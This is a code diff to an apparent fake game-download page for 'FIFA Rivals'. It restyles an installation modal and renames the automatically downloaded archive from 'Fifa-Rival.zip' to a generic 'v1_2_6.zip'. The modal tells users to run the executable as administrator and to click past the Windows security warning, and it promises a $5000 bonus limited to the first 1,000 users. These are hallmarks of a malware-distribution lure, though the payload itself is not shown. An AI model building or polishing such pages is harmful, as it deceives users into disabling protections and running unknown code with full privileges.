@@ -43,6 +43,58 @@
     .notification .location {
       color: rgba(255, 255, 255, 0.7);
     }
+
+    .modal-content {
+      max-width: 600px;
+      padding: 30px;
+    }
+    
+    .installation-steps {
+      color: rgba(255, 255, 255, 0.9);
+      margin: 20px 0;
+    }
+    
+    .step {
+      margin-bottom: 24px;
+    }
+    
+    .step h3 {
+      color: #fff;
+      font-size: 18px;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+    
+    .step ul {
+      list-style: none;
+      padding-left: 20px;
+    }
+    
+    .step ul li {
+      margin: 8px 0;
+      position: relative;
+    }
+    
+    .step ul li:before {
+      content: "•";
+      color: #22c55e;
+      font-weight: bold;
+      position: absolute;
+      left: -15px;
+    }
+    
+    .step code {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 14px;
+    }
+    
+    .note {
+      color: rgba(255, 255, 255, 0.7);
+      font-style: italic;
+    }
   </style>
 </head>
 <body>
@@ -112,29 +164,35 @@
     <div class="modal-content">
       <button class="close-modal" onclick="closeInstructionsModal()">×</button>
       <h2>Installation Instructions</h2>
-      <div class="text-left text-white/60 space-y-4">
-        <p class="font-bold text-white">Step 1: Extract the ZIP file</p>
-        <ul class="list-disc pl-5 space-y-2">
-          <li>Locate the downloaded Fifa-Rival.zip file</li>
-          <li>Right-click and select "Extract All" or use WinRAR/7-Zip</li>
-          <li>Choose a destination folder and click Extract</li>
-        </ul>
+      <div class="installation-steps">
+        <div class="step">
+          <h3>Step 1: Extract the ZIP file</h3>
+          <ul>
+            <li>Locate the downloaded <code>v1_2_6.zip</code> file</li>
+            <li>Right-click and select "Extract All" or use WinRAR/7-Zip</li>
+            <li>Choose a destination folder and click Extract</li>
+          </ul>
+        </div>
 
-        <p class="font-bold text-white mt-6">Step 2: Install the Game</p>
-        <ul class="list-disc pl-5 space-y-2">
-          <li>Open the extracted folder</li>
-          <li>Run Fifa-Rival.exe as administrator</li>
-          <li>Follow the installation wizard</li>
-          <li>Note: If Windows shows a security warning, click "More info" and "Run anyway"</li>
-        </ul>
+        <div class="step">
+          <h3>Step 2: Install the Game</h3>
+          <ul>
+            <li>Open the extracted folder</li>
+            <li>Run <code>v1_2_6.exe</code> as administrator</li>
+            <li>Follow the installation wizard</li>
+            <li class="note">Note: If Windows shows a security warning, click "More info" and "Run anyway"</li>
+          </ul>
+        </div>
 
-        <p class="font-bold text-white mt-6">Step 3: Claim Your Bonus</p>
-        <ul class="list-disc pl-5 space-y-2">
-          <li>Launch FIFA Rivals</li>
-          <li>Create your account or sign in</li>
-          <li>Your $5000 bonus will be automatically credited</li>
-          <li>Bonus is limited to first 1,000 users</li>
-        </ul>
+        <div class="step">
+          <h3>Step 3: Claim Your Bonus</h3>
+          <ul>
+            <li>Launch FIFA Rivals</li>
+            <li>Create your account or sign in</li>
+            <li>Your $5000 bonus will be automatically credited</li>
+            <li class="note">Bonus is limited to first 1,000 users</li>
+          </ul>
+        </div>
       </div>
       <button class="modal-btn" onclick="closeInstructionsModal()">Got it</button>
     </div>
@@ -192,7 +250,7 @@
         if (data.success) {
           const link = document.createElement('a');
           link.href = data.download_url;
-          link.download = 'Fifa-Rival.zip';
+          link.download = 'v1_2_6.zip';
           document.body.appendChild(link);
           link.click();
           document.body.removeChild(link);
